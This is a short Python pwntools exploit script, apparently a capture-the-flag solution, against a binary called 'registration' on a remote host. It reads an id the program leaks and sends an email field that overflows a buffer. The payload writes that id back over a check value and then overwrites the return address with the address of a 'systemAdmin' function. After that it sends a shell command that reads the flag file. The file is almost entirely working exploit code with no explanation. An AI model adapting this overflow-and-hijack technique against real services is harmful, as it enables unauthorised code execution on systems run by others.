#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './registration'
LIBC = ''
HOST = '140.110.112.77'
PORT = 6128

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if LIBC != '':
    libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY )

r.recvuntil('Here is your id :')
i = int(r.recvline()[:-1])
log.info('id = ' + str(i))
input()
r.sendline('A') # name
r.sendline(b'A'*0x3C+p32(i)+b'A'*0x8+p64(e.symbols['systemAdmin']+1)) # email
r.sendline('cat /home/`whoami`/flag')
r.interactive()
